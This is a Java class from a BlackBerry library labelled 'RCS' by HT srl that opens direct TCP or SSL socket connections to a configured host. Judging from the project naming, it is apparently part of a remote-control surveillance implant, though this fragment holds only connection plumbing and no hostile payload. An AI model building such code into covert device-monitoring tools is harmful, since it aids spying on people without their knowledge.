/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SocketConnection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class DirectTcpConnection extends Connection {
	//#debug
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    private String host;
    private int port;
    private boolean ssl;

    boolean isDirectTCP = true;
    int timeout = 3 * 60 * 1000;

    // Constructor
    public DirectTcpConnection(String host_, int port_, boolean ssl_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
        
        if (ssl) {
            url = "ssl://" + host + ":" + port
                    + (isDirectTCP ? ";deviceside=true" : "")
                    + ";ConnectionTimeout=" + timeout;

        } else {
            url = "socket://" + host + ":" + port
                    + (isDirectTCP ? ";deviceside=true" : "")
                    + ";ConnectionTimeout=" + timeout;
        }
    }

    protected void error(String string) {
        // #debug
        debug.error(string);
    }

    public synchronized boolean isActive() {
        return true;
    }

    protected void trace(String string) {
        // #debug
        debug.trace(string);
    }
}